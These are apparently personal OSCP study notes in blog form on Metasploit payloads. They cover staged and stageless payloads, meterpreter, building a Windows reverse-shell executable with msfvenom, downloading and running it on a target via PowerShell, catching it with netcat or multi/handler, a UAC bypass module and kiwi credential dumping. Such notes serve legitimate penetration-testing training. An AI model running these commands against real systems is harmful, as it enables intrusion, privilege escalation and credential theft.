---
layout: post
title: Metsploit Payloads
titledate: 09/25/23
tags: ["infosec", "offsec", "metasploit"]
---

#### staged vs stageless

- stageless a non-staged or stageless payload is sent with the shellcode along with the exploit it is considered an all in one exploit and is typically more stable, however, it is larger in size

- staged a staged payload is sent in parts where the first part is meant to establish the connection to the attacker and then in the second part the rest of the shellcode is sent to the target - a staged payload is not only smaller in size, but the 2nd part of shellcode that is retrieved is loaded into memory and may more easily escape detection by AV

to view compatible payloads for a chosen exploit

    msf> show payloads

to identify staged vs stageless in msf, the / character will be used for staged and a payload description will usually identify the payload for example

    payload/linux/x64/shell/reverse_tcp 
        Reverse TCP Stager
    payload/linux/x64/shell_reverse_tcp  
        Reverse TCP Inline

#### meterpreter

meterpreter is a msf payload that resides in memory and can be especially useful in post exploitation

all meterpreter payloads are staged , but the payload can be distributed in a stageless manner to the target in which it contains all the components required to launch a meterpreter session

if we select a meterpreter payload

    msf> set payload linux/x64/meterpreter_reverse_tcp

    msf> run

we can get system info, and even an interactive shell

    msf> sysinfo

    msf> shell

we can upload and download files and even use an HTTPS encrypted meterpreter payload to help bypass AV

#### msfvenom

we use msfvenom to create binaries from the msf payload libraries outside of msf

to list available payload options by search

    $ msfvenom -l payloads --platform windows --arch x64

let's create our binary with our payload, lhost lport file format and file output name

    $ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.2 LPORT=443 -f exe -o nonstaged.exe

we can experiment with both staged and non staged to see differences in our results

for the non staged we can use powershell to copy over the msfvenom reverse shell binary to our target

    PS> iwr -uri http://192.168.1.1/nonstaged.exe -Outfile nonstaged.exe

start our netcat listener

    $ nc -nvlp 443

and then execute on our target

    PS> .\nonstaged.exe

then for the staged payload we can not use netcat bc it can not handle staged payloads

#### NOTE: we can only use meterpreter once for OSCP, but we can use a staged listener in the multi/handler

    msf> use multi/handler

    msf> set payload windows/x64/shell/reverse_tcp

this should catch our staged payload

some shell type shortcuts

[msfvenom](https://github.com/lexisrepo/Shells)

#### post exploitation

msf includes many post exploitation features useful ones for us would be hash dumps , getuid, getsystem

we must get privs before migrating process

list with 

    msf> ps

    msf> migrate pid

dump env 

    msf> getenv

#### bypass UAC

if we have a meterpreter session we can enter a shell and attempt to bypass UAC

    msf> shell

    C:> powershell -ep bypass

    PS> Import-Module NtObjectManager

    PS> Get-NtTokenIntegrityLevel

this will show us the integrity level of the process we are executing in

we can ctrl+z to bacground the shell and then hit bg to background the session

    msf> search UAC

this search will show several UAC bypasses we can choose from

    msf > use exploit/windows/local/bypassuac_sdclt

we choose one and then enter the options for the background session we already have

    msf> set SESSION 9

    msf> set lhost 192.168.1.1

    msf> run

now if we enter a shell

    msf> shell

    C:> powershell -ep bypass

    PS> Import-Module NtObjectManager

    PS> Get-NtTokenIntegrityLevel

we can see the integrity level is high so we've bypassed UAC

#### kiwi

kiwi is another meterpreter module that can be loaded but it needs administrator privs

so if we execute a meterpreter session and execute

    msf> getsystem

to elevate our privs, we can then load kiwi

    msf> load kiwi

    msf> help

    msf> creds_msv

this will allow us to dump user creds if we have sufficent privs

